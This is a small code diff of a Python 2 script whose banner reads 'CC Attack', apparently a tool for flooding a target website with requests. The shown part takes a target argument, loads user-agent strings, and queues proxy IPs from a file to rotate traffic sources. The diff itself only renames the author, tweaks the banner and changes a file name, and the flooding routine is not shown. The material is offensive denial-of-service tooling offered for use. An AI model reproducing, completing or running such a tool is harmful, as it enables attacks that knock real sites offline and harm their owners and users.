@@ -6,20 +6,20 @@ import sys
 import Queue
 import random
 
-__author__ = 'kkk'
+__author__ = 'whois'
 __date__   = '17/5/17'
 
 with open('pytxt/user-agents.txt','r') as f:
     agents_list = [ line.rstrip() for line in f.readlines()]
 
 if len(sys.argv) == 1:
-    print "[]-----------------CC Attack----------------[]"
+    print "[+]-----------------CC Attack----------------[+]"
     print ""
     print "[*] python {0} [target] <proxy_ip>".format(sys.argv[0])
     exit(1)
 
 TARGET = sys.argv[1]
-IPFILES = sys.argv[2] if len(sys.argv) == 3 else 'output/proxy_ip.txt'
+IPFILES = sys.argv[2] if len(sys.argv) == 3 else 'output/proxy_ips.txt'
 
 proxy_ip = Queue.Queue()
 with open(IPFILES,'r') as f:
